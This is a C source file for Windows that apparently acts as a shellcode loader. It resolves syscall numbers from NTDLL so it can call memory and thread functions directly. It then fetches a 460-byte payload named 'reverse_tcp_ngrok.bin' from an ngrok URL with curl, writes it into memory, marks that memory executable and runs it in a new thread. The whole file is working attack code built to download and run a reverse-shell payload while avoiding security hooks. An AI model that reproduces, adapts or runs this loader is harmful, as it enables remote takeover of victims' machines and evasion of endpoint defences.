#include "header.h"
#define NtCurrentProcessId() (NtCurrentTeb()->ClientId.UniqueProcess)

int main() {
	
	//--------------------[INITIALIZING VARIABLES]------------------//

	UCHAR PAYLOAD[460];
	SIZE_T payloadSize = sizeof(PAYLOAD);
	HMODULE hNTDLL = GetModuleHandleW(L"NTDLL");
	NTSTATUS STATUS = 0;
	PVOID remoteBuffer = NULL;
	HANDLE hProcess = GetCurrentProcess();
	SIZE_T zeroBytes = 0;
	HANDLE hThread = NULL;
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
	ULONG oldProtect = PAGE_READWRITE;

	OKAY("process handle -> 0x%p", hProcess);

	//--------------------[GET SYSCALL INFO]-----------------------//

	GetSyscallAddr(hNTDLL, &NtSyscallAddr);

	GetSSN(hNTDLL, "NtAllocateVirtualMemory", &NtVirtualAllocSSN);
	GetSSN(hNTDLL, "NtWriteVirtualMemory", &NtWriteMemSSN);
	GetSSN(hNTDLL, "NtCreateThreadEx", &NtCreateThreadSSN);
	GetSSN(hNTDLL, "NtProtectVirtualMemory", &NtProtectVirtualMemorySSN);
	GetSSN(hNTDLL, "NtWaitForSingleObject", &NtWaitForSSN);
	GetSSN(hNTDLL, "NtClose", &NtCloseSSN);

	//-----------------------[ALLOCATE MEMORY]---------------------//

	STATUS = NtAllocateVirtualMemory(hProcess, &remoteBuffer, 0, &payloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	if (STATUS != STATUS_SUCCESS) {
		WARN("could not allocate memory, error: 0x%lx", STATUS);
		return EXIT_FAILURE;
	}
	OKAY("allocated memory with perm RW -> 0x%p", remoteBuffer);

	//----------------[FETCH PAYLOAD FROM HTTP SERVER]-------------//

	if (!DownloadPayload("curl https://5978-2405-201-401c-4e51-b2ce-55a1-e440-f124.ngrok-free.app/reverse_tcp_ngrok.bin", 460, &PAYLOAD)) {
		WARN("payload could not be downloaded");
		return EXIT_FAILURE;
	}
	
	//--------------------[PRINTING PAYLOAD]--------------//

	printf("\n");
	for (int i = 0; i < 460; i++) {
		if (i % 32 == 0 && i != 0)
			printf("\n %02x", PAYLOAD[i]);
		else
			printf(" %02x", PAYLOAD[i]);
		Sleep(10);
	}
	printf("\n\n");

	//-----------------------[WRITE PAYLOAD]-----------------------//

	STATUS = NtWriteVirtualMemory(hProcess, remoteBuffer, PAYLOAD, sizeof(PAYLOAD), &zeroBytes);
	if (STATUS != STATUS_SUCCESS) {
		WARN("could not write memory, error: 0x%lx", STATUS);
		return EXIT_FAILURE;
	}
	OKAY("wrote %zu bytes in memory", sizeof(PAYLOAD));

	//---------------------[EXECUTE PERMS]-------------------------//

	payloadSize = sizeof(PAYLOAD);

	STATUS = NtProtectVirtualMemory(hProcess, &remoteBuffer, &payloadSize, PAGE_EXECUTE_READ, &oldProtect);
	if (STATUS != STATUS_SUCCESS) {
		WARN("could not change perms, error: 0x%lx", STATUS);
		return EXIT_FAILURE;
	}
	OKAY("perms changed to RX");

	//-----------------------[CREATE THREAD]-----------------------//

	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteBuffer, NULL, 0, 0, 0, 0, NULL);
	if (STATUS != STATUS_SUCCESS) {
		WARN("could not create thread, error: 0x%lx", STATUS);
		return EXIT_FAILURE;
	}
	OKAY("created thread -> 0x%p, code: 0x%lx", hThread, STATUS);

	//----------------------[WAIT FOR THREAD]-----------------------//

	NtWaitForSingleObject(hThread, FALSE, NULL);
	OKAY("thread finished, cleaning up...");

	//--------------------------[CLEANUP]---------------------------//

	NtClose(hThread);
	OKAY("done");

	return EXIT_SUCCESS;
}